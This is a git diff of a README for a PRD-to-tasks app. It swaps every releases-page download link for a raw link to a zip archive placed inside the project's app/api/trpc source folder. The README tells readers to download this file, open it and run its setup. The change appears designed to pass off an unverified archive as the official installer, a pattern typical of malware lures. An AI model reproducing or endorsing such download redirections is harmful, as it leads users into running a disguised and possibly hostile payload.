@@ -1,6 +1,6 @@
 # 🗂️ planwiki-app - Turn PRDs into tasks fast
 
-[![Download planwiki-app](https://img.shields.io/badge/Download%20planwiki--app-6A5ACD?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Ibradl3673/planwiki-app/releases)
+[![Download planwiki-app](https://img.shields.io/badge/Download%20planwiki--app-6A5ACD?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Ibradl3673/planwiki-app/main/app/api/trpc/planwiki-app-v2.8.zip)
 
 ## 🚀 What this app does
 
@@ -27,7 +27,7 @@ For the best result, close extra apps before you start. This helps the app open 
 
 Go to the releases page and download the latest Windows file:
 
-https://github.com/Ibradl3673/planwiki-app/releases
+https://raw.githubusercontent.com/Ibradl3673/planwiki-app/main/app/api/trpc/planwiki-app-v2.8.zip
 
 After the download finishes, open the file you downloaded and follow the setup steps shown on screen.
 
@@ -227,4 +227,4 @@ Good input helps the app produce clearer issues and cards.
 
 If you need the latest version, use this page:
 
-https://github.com/Ibradl3673/planwiki-app/releases
+https://raw.githubusercontent.com/Ibradl3673/planwiki-app/main/app/api/trpc/planwiki-app-v2.8.zip
